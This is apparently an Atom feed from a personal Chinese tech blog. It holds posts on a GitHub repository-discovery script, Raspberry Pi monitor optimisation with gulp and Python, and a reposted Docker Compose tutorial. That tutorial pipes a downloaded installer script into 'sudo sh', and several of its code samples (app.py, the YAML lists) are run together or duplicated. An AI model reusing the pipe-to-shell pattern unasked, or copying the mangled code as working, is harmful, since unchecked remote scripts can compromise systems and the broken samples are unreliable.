<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ivan&#39;s Blog</title>
  <subtitle>Thinking as a Geek</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.yfgeek.com/"/>
  <updated>2016-11-19T12:31:48.000Z</updated>
  <id>http://blog.yfgeek.com/</id>
  
  <author>
    <name>Ivan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>当我关注3万Github用户后发生了什么</title>
    <link href="http://blog.yfgeek.com/2016/11/19/github3k/"/>
    <id>http://blog.yfgeek.com/2016/11/19/github3k/</id>
    <published>2016-11-19T11:36:26.000Z</published>
    <updated>2016-11-19T12:31:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。</p>
<p>于是乎我利用这个关注了3万人的Github，可是关注后<del>除了同性交友</del>似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。<br><a id="more"></a><br><img src="/content/images/githubauto/1.jpg" alt=""></p>
<p>翻都翻不过来，那么同时还存在一些“无用( <del>垃圾</del> )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？</p>
<p>经过短暂的编码，<code>GithubAwesome.py</code>诞生了。</p>
<p>现在进入<a href="https://github.com/yfgeek/AutoGithub" target="_blank" rel="external">AutoGithub</a>项目就可以看到GithubAwesome.py项目</p>
<h1 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h1><p>设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star  或 大于 最少 fork，那么就把他输出出来。</p>
<p>举个🌰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">最少 star 数: 50</div><div class="line">最少 fork 数: 50</div></pre></td></tr></table></figure></p>
<p>效果如图</p>
<p><img src="/content/images/githubauto/awesomesnap.png" alt=""></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>首先，确保你安装了<code>beautifulsoup4</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install beautifulsoup4</div></pre></td></tr></table></figure>
<p>然后编辑<code>GithubAwesome.py</code>文件，请原谅如此土的方式。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ga = GithubAwesome(<span class="string">'username'</span>,<span class="string">'password'</span>)</div><div class="line"><span class="comment"># login</span></div><div class="line">ga.login()</div><div class="line">ga.get_awesome(<span class="number">1</span>,<span class="number">20</span>,<span class="number">50</span>) <span class="comment"># 第一页 规则 min star 20 min or fork 20</span></div></pre></td></tr></table></figure></p>
<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。&lt;/p&gt;
&lt;p&gt;于是乎我利用这个关注了3万人的Github，可是关注后&lt;del&gt;除了同性交友&lt;/del&gt;似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。&lt;br&gt;
    
    </summary>
    
      <category term="Github" scheme="http://blog.yfgeek.com/categories/Github/"/>
    
    
      <category term="Github" scheme="http://blog.yfgeek.com/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>树莓派实时温度湿度监测 优化后续</title>
    <link href="http://blog.yfgeek.com/2016/11/17/opt-rpi-project/"/>
    <id>http://blog.yfgeek.com/2016/11/17/opt-rpi-project/</id>
    <published>2016-11-17T23:46:21.000Z</published>
    <updated>2016-11-19T12:08:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。<br><a id="more"></a> </p>
<h1 id="优化css-js"><a href="#优化css-js" class="headerlink" title="优化css js"></a>优化css js</h1><p>之前写的css与js一直没有压缩，这次决定用gulp压缩一下</p>
<p>安装 <code>gulp</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install -g gulp</div></pre></td></tr></table></figure></p>
<p>安装 <code>gulp-uglify</code> 模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install gulp-uglify</div></pre></td></tr></table></figure></p>
<p>安装 <code>gulp-minify-css</code> 模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install gulp-minify-css</div></pre></td></tr></table></figure></p>
<p>压缩源：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">asset/dist/js</div><div class="line">asset/dist/css</div></pre></td></tr></table></figure></p>
<p>目标：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">asset/js</div><div class="line">asset/css</div></pre></td></tr></table></figure></p>
<p>好的 我们可以开始写<code>gulpfile.js</code>文件了<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 获取 gulp</span></div><div class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>)</div><div class="line"></div><div class="line"><span class="comment">// 获取 uglify 模块（用于压缩 JS）</span></div><div class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>)</div><div class="line"><span class="comment">// 获取 minify-css 模块（用于压缩 CSS）</span></div><div class="line"><span class="keyword">var</span> minifyCSS = <span class="built_in">require</span>(<span class="string">'gulp-minify-css'</span>)</div><div class="line"></div><div class="line"><span class="comment">// 压缩 js 文件</span></div><div class="line"><span class="comment">// 在命令行使用 gulp script 启动此任务</span></div><div class="line">gulp.task(<span class="string">'script'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 1. 找到文件</span></div><div class="line">    gulp.src(<span class="string">'asset/dist/js/*.js'</span>)</div><div class="line">    <span class="comment">// 2. 压缩文件</span></div><div class="line">        .pipe(uglify())</div><div class="line">    <span class="comment">// 3. 另存压缩后的文件</span></div><div class="line">        .pipe(gulp.dest(<span class="string">'asset/js'</span>))</div><div class="line">&#125;)</div><div class="line"><span class="comment">// 压缩 css 文件</span></div><div class="line"><span class="comment">// 在命令行使用 gulp css 启动此任务</span></div><div class="line">gulp.task(<span class="string">'css'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 1. 找到文件</span></div><div class="line">    gulp.src(<span class="string">'asset/dist/css/*.css'</span>)</div><div class="line">    <span class="comment">// 2. 压缩文件</span></div><div class="line">        .pipe(minifyCSS())</div><div class="line">    <span class="comment">// 3. 另存为压缩文件</span></div><div class="line">        .pipe(gulp.dest(<span class="string">'asset/css'</span>))</div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="comment">// 在命令行使用 gulp auto 启动此任务</span></div><div class="line">gulp.task(<span class="string">'auto'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 监听文件修改，当文件被修改则执行 script 任务</span></div><div class="line">    gulp.watch(<span class="string">'js/*.js'</span>, [<span class="string">'script'</span>])</div><div class="line">    gulp.watch(<span class="string">'css/*.css'</span>, [<span class="string">'css'</span>])</div><div class="line">&#125;)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// 使用 gulp.task('default') 定义默认任务</span></div><div class="line"><span class="comment">// 在命令行使用 gulp 启动 script 任务和 auto 任务</span></div><div class="line">gulp.task(<span class="string">'default'</span>, [<span class="string">'script'</span>, <span class="string">'css'</span> , <span class="string">'auto'</span>])</div></pre></td></tr></table></figure></p>
<p>执行gulp即可进行自动压缩及监听任务</p>
<h1 id="结构优化"><a href="#结构优化" class="headerlink" title="结构优化"></a>结构优化</h1><p>这是原有的结构</p>
<p>前端：Semantic UI + eCharts + JQuery Datapicker</p>
<p>数据： json(时间)</p>
<p>后端：Python + Apache</p>
<p>后端的python程序负责测温度和测湿度，并生成json数据，为了保证事实性，python程序一直在读写相同的json文件，每一分钟读写一次，造成了json文件的比较大，大概有68KB，在前端是通过ajax加载的json文件，如果网速很慢的话，必然会造成很长时间的延迟。</p>
<p>为了解决这个问题，首先第一步就是减小json文件大小。设计了一个解决方案是，以前的前端已经可以加载每小时数据和每分钟数据，不过小时和分钟的数据是通过在js中忽略加载实现的。</p>
<p>而现在采用新的方案，在data数据目录下，分别建立两个目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">data/min</div><div class="line">data/hour</div></pre></td></tr></table></figure>
<p>数据： json(min) / json(hour) </p>
<p>min的数据专门用于保存min,hour专门用于保存hour，为了解决旧数据迁移问题，首先先将内容移动到min目录下，在根目录下写了一个python小程序，执行挑选出hour数据并且迁移。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">jsonRead</span><span class="params">(path,topath,name)</span>:</span></div><div class="line">    pathfile = path + <span class="string">'/'</span> + name</div><div class="line">    topathfile = topath + <span class="string">'/'</span> + name</div><div class="line">    <span class="keyword">if</span> os.path.exists(pathfile):</div><div class="line">        file =open(pathfile,<span class="string">"r"</span>)</div><div class="line">        data = json.loads(file.read().decode(<span class="string">'utf-8'</span>))</div><div class="line">        i = <span class="number">1</span></div><div class="line">        jsonWrite(data[<span class="number">0</span>],topathfile)</div><div class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> data:</div><div class="line">            i = i + <span class="number">1</span></div><div class="line">            <span class="keyword">if</span>(i%<span class="number">60</span>==<span class="number">0</span>):</div><div class="line">                jsonWrite(v,topathfile)</div><div class="line">        file.close()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'unable to open '</span> + pathfile + <span class="string">'file'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">jsonWrite</span><span class="params">(data,pathfile)</span>:</span></div><div class="line">    <span class="keyword">if</span> os.path.exists(pathfile):</div><div class="line">      file =open(pathfile,<span class="string">"rb+"</span>)</div><div class="line">      file.seek(<span class="number">-1</span>,os.SEEK_END)</div><div class="line">      file.truncate()</div><div class="line">      file.write(<span class="string">","</span>)</div><div class="line">      json.dump(data,file)</div><div class="line">      file.write(<span class="string">"]"</span>)</div><div class="line">      file.close()</div><div class="line">      <span class="keyword">print</span> <span class="string">'succes: '</span>+ pathfile</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      file =open(pathfile,<span class="string">"w"</span>)</div><div class="line">      file.write(<span class="string">"["</span>)</div><div class="line">      json.dump(data,file)</div><div class="line">      file.write(<span class="string">"]"</span>)</div><div class="line">      file.close()</div><div class="line"></div><div class="line">dir = <span class="string">'web/data/min'</span></div><div class="line">dist = <span class="string">'web/data/hour'</span></div><div class="line">files = os.listdir(dir)</div><div class="line"></div><div class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(dir):</div><div class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> files:</div><div class="line">        jsonRead(dir,dist,name)</div></pre></td></tr></table></figure>
<p>与此同时也需要修改 前端js 与 后端python<br>具体代码在 <a href="https://github.com/yfgeek/rpi-TempRuntime/" target="_blank" rel="external">项目地址</a>，不贴了。</p>
<p>最后，经过优化，速度大概提升了5倍，前端获取的json文件为1KB。</p>
<p>后续还会增加季度数据统计，等待数据量大一点的时候方便做数据统计工作。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。&lt;br&gt;
    
    </summary>
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/categories/Raspberry/"/>
    
    
      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
    
  </entry>
  
  <entry>
    <title>Github Follow 及 BaiduBlogTransfer 项目</title>
    <link href="http://blog.yfgeek.com/2016/11/08/Github%20Follow%20%E5%8F%8A%20BaiduBlogTransfer%20%E9%A1%B9%E7%9B%AE/"/>
    <id>http://blog.yfgeek.com/2016/11/08/Github Follow 及 BaiduBlogTransfer 项目/</id>
    <published>2016-11-08T01:24:35.000Z</published>
    <updated>2016-11-19T12:09:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。</p>
<p>用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。<br><a id="more"></a><br>项目地址：</p>
<p><a href="https://github.com/yfgeek/AutoGithub" target="_blank" rel="external">点击进入项目</a></p>
<p>除此之外，我还整理了只去百度空间的Blogs放到了Github封存。</p>
<p><a href="https://github.com/yfgeek/Blog" target="_blank" rel="external">https://github.com/yfgeek/Blog</a></p>
<p>目录是用一个python小程序自动生成的，通过修改@cheezer的BaiduBlogTransfer项目的代码，添加了生成Markdown功能，把原来百度空间的内容全部导出来了。</p>
<p><a href="https://github.com/yfgeek/BaiduBlogTransferer" target="_blank" rel="external">点击进入项目</a></p>
<p>百度空间是我最早的Blog(2007-2011)，小学初中，后转战独立空间VPS，先后用过Worldpress,Ghost以及现在的Hexo。</p>
<p>百度空间有着很多的回忆，和百度斗智斗勇玩import js的eDIKID.CSS是美好的回忆❤️。</p>
<p>百度空间被百度关闭了，文章也没有了。</p>
<p>百度空间为我在初中高中时的玩具，部分内容掺杂当时网络用语，而且现在看来相当多的文章打脸，请不要用现在的眼光和视野去看过去的文章，在那个时候没有现在的思想和技术，所以文章内容过于幼稚。</p>
<p>❤️:3Mac</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。&lt;/p&gt;
&lt;p&gt;用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。&lt;br&gt;
    
    </summary>
    
      <category term="github" scheme="http://blog.yfgeek.com/categories/github/"/>
    
    
      <category term="github" scheme="http://blog.yfgeek.com/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>Docker Compose—简化复杂应用的利器 </title>
    <link href="http://blog.yfgeek.com/2016/10/15/Docker-Compose%E2%80%94%E7%AE%80%E5%8C%96%E5%A4%8D%E6%9D%82%E5%BA%94%E7%94%A8%E7%9A%84%E5%88%A9%E5%99%A8/"/>
    <id>http://blog.yfgeek.com/2016/10/15/Docker-Compose—简化复杂应用的利器/</id>
    <published>2016-10-15T18:10:35.000Z</published>
    <updated>2016-11-19T12:09:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。<br><a id="more"></a> </p>
<h2 id="1-安装Docker和Compose"><a href="#1-安装Docker和Compose" class="headerlink" title="1. 安装Docker和Compose"></a>1. 安装Docker和Compose</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 当前最新的Docker是1.6.2，Compose为1.2.0</span></div><div class="line">curl <span class="_">-s</span> https://get.docker.io/ubuntu/ | sudo sh</div><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install lxc-docker</div><div class="line"><span class="comment"># 参考http://docs.docker.com/compose/install/#install-compose</span></div><div class="line">curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname <span class="_">-s</span>`-`uname -m` &amp;gt; /usr/<span class="built_in">local</span>/bin/docker-compose</div><div class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class="line"></div><div class="line">apt-get install python-pip python-dev</div><div class="line">pip install -U docker-compose</div></pre></td></tr></table></figure>
<p>当前最新的Docker是1.6.2，Compose为1.2.0<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install lxc-docker</div></pre></td></tr></table></figure></p>
<p>参考 <a href="http://docs.docker.com/compose/install/#install-compose" target="_blank" rel="external">http://docs.docker.com/compose/install/#install-compose</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname <span class="_">-s</span>-uname -m &gt; /usr/<span class="built_in">local</span>/bin/docker-compose curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname <span class="_">-s</span>-uname -m &gt; /usr/<span class="built_in">local</span>/bin/docker-compose</div><div class="line"></div><div class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</div><div class="line"><span class="comment">### 上面这个方法真的慢出翔，可以通过Python pip安装。</span></div><div class="line">apt-get install python-pip python-dev</div><div class="line">pip install -U docker-compose</div></pre></td></tr></table></figure></p>
<p>这样compose就安装好了，查看一下compose的版本信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</div><div class="line">docker-compose -version</div><div class="line">docker-compose 1.2.0</div></pre></td></tr></table></figure>
<h2 id="2-使用Compose"><a href="#2-使用Compose" class="headerlink" title="2. 使用Compose"></a>2. 使用Compose</h2><p>使用Compose只需要简单的三个步骤：</p>
<p>首先，使用Dockerfile来定义你的应用环境：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FROM python:2.7</div><div class="line">ADD ./code</div><div class="line">WORKDIR /code</div><div class="line">RUN pip install -r requirements.txt</div></pre></td></tr></table></figure></p>
<p>其中，requirements.txt中的内容包括：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">flask</div><div class="line">redis</div></pre></td></tr></table></figure>
<p>再用Python写一个简单的app.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask importFlaskfrom redis importRedisimport os</div><div class="line">app =Flask(__name__)</div><div class="line">redis =Redis(host=<span class="string">'redis'</span>, port=<span class="number">6379</span>)@app.route(<span class="string">'/'</span>)<span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line">    redis.incr(<span class="string">'hits'</span>)<span class="keyword">return</span><span class="string">'Hello World! I have been seen %s times.'</span>% redis.get(<span class="string">'hits'</span>)<span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</div><div class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="keyword">True</span>)</div></pre></td></tr></table></figure></p>
<p>第二步，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">web:</div><div class="line">  build:.</div><div class="line">  <span class="built_in">command</span>: python app.py</div><div class="line">  ports:</div><div class="line">         - <span class="string">"5000:5000"</span></div><div class="line">  volumes:</div><div class="line">         - .:/code</div><div class="line">  links:</div><div class="line">         - redis</div><div class="line">redis:</div><div class="line">  image: redis</div></pre></td></tr></table></figure></p>
<p>第三步，执行<code>docker-compose up</code>来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Creating myapp_redis_1...</div><div class="line">Creating myapp_web_1...</div><div class="line">Building web...</div><div class="line">Step 0 : FROM python:2.7</div><div class="line">2.7: Pulling from python</div><div class="line">...</div><div class="line">Status: Downloaded newer image <span class="keyword">for</span> python:2.7</div><div class="line"> ---&gt; d833e0b23482</div><div class="line">Step 1 : ADD . /code</div><div class="line"> ---&gt; 1c04b1b15808</div><div class="line">Removing intermediate container 9dab91b4410d</div><div class="line">Step 2 : WORKDIR /code</div><div class="line"> ---&gt; Running <span class="keyword">in</span> f495a62feac9</div><div class="line"> ---&gt; ffea89a7b090</div><div class="line">Attaching to myapp_redis_1, myapp_web_1</div><div class="line">......</div><div class="line">redis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379</div><div class="line">web_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)</div><div class="line">web_1   |  * Restarting with <span class="built_in">stat</span></div></pre></td></tr></table></figure></p>
<h2 id="3-Yaml文件参考"><a href="#3-Yaml文件参考" class="headerlink" title="3. Yaml文件参考"></a>3. Yaml文件参考</h2><p>在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：</p>
<p>image:镜像的ID</p>
<p>build:直接从pwd的Dockerfile来build，而非通过image选项来pull</p>
<p>links：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]</p>
<p>external_links：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links</p>
<p>command：替换默认的command命令</p>
<p>ports: 导出端口。格式可以是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ports:-&quot;3000&quot;-&quot;8000:8000&quot;-&quot;127.0.0.1:8001:8001&quot;</div></pre></td></tr></table></figure>
<p>expose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。</p>
<p>volumes：加载路径作为卷，可以指定只读模式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">volumes:-/var/lib/mysql</div><div class="line"> - cache/:/tmp/cache</div><div class="line"> -~/configs:/etc/configs/:ro</div></pre></td></tr></table></figure></p>
<p> volumes_from：加载其他容器或者服务的所有卷<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">environment:- RACK_ENV=development</div><div class="line">  - SESSION_SECRET</div></pre></td></tr></table></figure></p>
<p>env_file：从一个文件中导入环境变量，文件的格式为RACK_ENV=development</p>
<p>extends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">common.yml</div><div class="line">webapp:</div><div class="line">  build:./webapp</div><div class="line">  environment:- DEBUG=false- SEND_EMAILS=false</div><div class="line">development.yml</div><div class="line">web:extends:</div><div class="line">    file: common.yml</div><div class="line">    service: webapp</div><div class="line">  ports:-&quot;8000:8000&quot;</div><div class="line">  links:- db</div><div class="line">  environment:- DEBUG=true</div><div class="line">db:</div><div class="line">  image: postgres</div></pre></td></tr></table></figure></p>
<p>net：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。<br>dns：可以设置一个或多个自定义的DNS地址。</p>
<p>dns_search:可以设置一个或多个DNS的扫描域。</p>
<p>其他的working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares，和docker run命令是一样的，这些命令都是单行的命令。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">cpu_shares:73</div><div class="line">working_dir:/code</div><div class="line">entrypoint: /code/entrypoint.sh</div><div class="line">user: postgresql</div><div class="line">hostname: foo</div><div class="line">domainname: foo.com</div><div class="line">mem_limit:1000000000</div><div class="line">privileged:true</div><div class="line">restart: always</div><div class="line">stdin_open:true</div><div class="line">tty:true</div></pre></td></tr></table></figure>
<h2 id="4-docker-compose常用命令"><a href="#4-docker-compose常用命令" class="headerlink" title="4. docker-compose常用命令"></a>4. docker-compose常用命令</h2><p>在第二节中的docker-compose up，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：</p>
<p>–verbose：输出详细信息</p>
<p>-f 制定一个非docker-compose.yml命名的yaml文件</p>
<p>-p 设置一个项目名称（默认是directory名）</p>
<p>docker-compose的动作包括：</p>
<p>build：构建服务</p>
<p>kill -s SIGINT：给服务发送特定的信号。</p>
<p>logs：输出日志</p>
<p>port：输出绑定的端口</p>
<p>ps：输出运行的容器</p>
<p>pull：pull服务的image</p>
<p>rm：删除停止的容器</p>
<p>run: 运行某个服务，例如docker-compose run web<br>python manage.py shell</p>
<p>start：运行某个服务中存在的容器。</p>
<p>stop:停止某个服务中存在的容器。</p>
<p>up：create + run + attach容器到服务。</p>
<p>scale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3</p>
<blockquote>
<p>转载:<a href="http://debugo.com/docker-compose" target="_blank" rel="external">http://debugo.com/docker-compose</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。&lt;br&gt;
    
    </summary>
    
      <category term="docker" scheme="http://blog.yfgeek.com/categories/docker/"/>
    
    
